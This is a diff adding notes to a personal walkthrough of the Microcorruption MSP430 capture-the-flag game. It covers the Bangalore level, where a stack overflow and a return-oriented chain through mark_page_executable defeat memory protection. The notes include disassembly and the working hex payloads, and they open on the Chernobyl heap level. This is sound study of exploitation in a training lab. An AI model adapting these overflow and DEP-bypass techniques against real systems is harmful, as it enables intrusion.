@@ -744,3 +744,59 @@ return address and before the first argument.
 I also had entered my 7f value as 007f instead of accounting for endianess and
 entering it as 7f00.  After correcting those two errors, it worked!
 ### Level 15 / Bangalore (DEP)
+This is rev e.01...so should be a brand new type of challenge!
+"Lockitall engineers  have worked for  over a year to  bring memory
+    protection to  the MSP430---a  truly amazing achievement.  Each of
+    the 256  pages can  either be executable  or writeable,  but never
+    both, finally  bringing to  a close  some of  the issues  in prior
+    versions."
+This type of protection is called Data Execution Prevention (DEP), and usually ROP chains/gadgets are used to get around it.  Since memory can no longer be writable and executable, we can no longer write our instructions to memory and then change execution to that point.  Instead, we must modify the stack to call and use the functions already in the executable with parameters that we choose.
+
+```
+4512 <login>
+4512:  3150 f0ff      add	#0xfff0, sp
+4516:  3f40 0024      mov	#0x2400, r15
+451a:  b012 7a44      call	#0x447a <puts>
+451e:  3f40 2024      mov	#0x2420, r15
+4522:  b012 7a44      call	#0x447a <puts>
+4526:  3e40 3000      mov	#0x30, r14
+452a:  0f41           mov	sp, r15
+452c:  b012 6244      call	#0x4462 <getsn>
+4530:  3f40 6524      mov	#0x2465, r15
+4534:  b012 7a44      call	#0x447a <puts>
+4538:  3150 1000      add	#0x10, sp
+453c:  3041           ret
+```
+We can see that 0x10 bytes are allocated on the stack, and we are then allowed to enter 0x30 bytes...so we have an easy stack overflow...but what to do with it?
+There doesn't look to be any useful instructions in our program, so we'll have to learn how to use what we have to trigger a 0x7f interrupt.  There isn't even an INT function, so we'll need to write that as well.
+```
+457a <INT>
+457a:  1e41 0200      mov	0x2(sp), r14
+457e:  0212           push	sr
+4580:  0f4e           mov	r14, r15
+4582:  8f10           swpb	r15
+4584:  024f           mov	r15, sr
+4586:  32d0 0080      bis	#0x8000, sr
+458a:  b012 1000      call	#0x10
+458e:  3241           pop	sr
+4590:  3041           ret
+```
+Based on this and our knowledge from the previous level, we again simply need to get 0xff00 in to sr and then call/jump to 0x10.  We need to check the exisitng program to see if there's anything adjusting the sr to 0xff00 and then call/jump to 0x10.
+I didnt see any instructions that did what i wanted.  So maybe instead we can set up the stack, then get it to call to mark_page_executable for us?  mark_page_executable takes one parameter in r15 and then makes that address executable.
+If we want to mark pages as executable (since the stack should already be writable), we can use mark_page_executable starting at
+```
+44ba:  3180 0600      sub	#0x6, sp
+44be:  3240 0091      mov	#0x9100, sr
+44c2:  b012 1000      call	#0x10
+44c6:  3150 0a00      add	#0xa, sp
+44ca:  3041           ret
+```
+With our arguments already on the stack.  We need to have have the address, followed by a 0 to indicate executable.  Luckily since we're not using strcpy() needing a 0x00 shouldn't be a problem..I hope!
+41414141414141414141414141414141ba4440004141414141414141e040 - this input was my attempt at getting page 0x40 executable...i got an error saying address 0x4141 wasn't executable, so i changed my input to
+41414141414141414141414141414141ba4441004141414141414141e040 which then made me get an insn address unaligned...which i think was a good thing!
+Note - apparently jmp #0x10 doesn't work and I needed to use call #0x10.  I used
+324000ffb01210004141414141414141ba443f004142ee3f41454147e040  for my input and it worked!  This was definitely a cool ROP challenge!
+
+### Level 16 / Chernobyl (Hardware revision D, Software 02)
+Looking back through my notes I see that hardware revision D software 01 was Algiers, which was the heap exploitation level.
+Looking through the program very quickly I see that it has walk/run/get_from_table/hash/rehash/get_from_table/create_hash_table/malloc/free functions...this looks like writing past a malloc'd buffer is going to be a little harder this time!
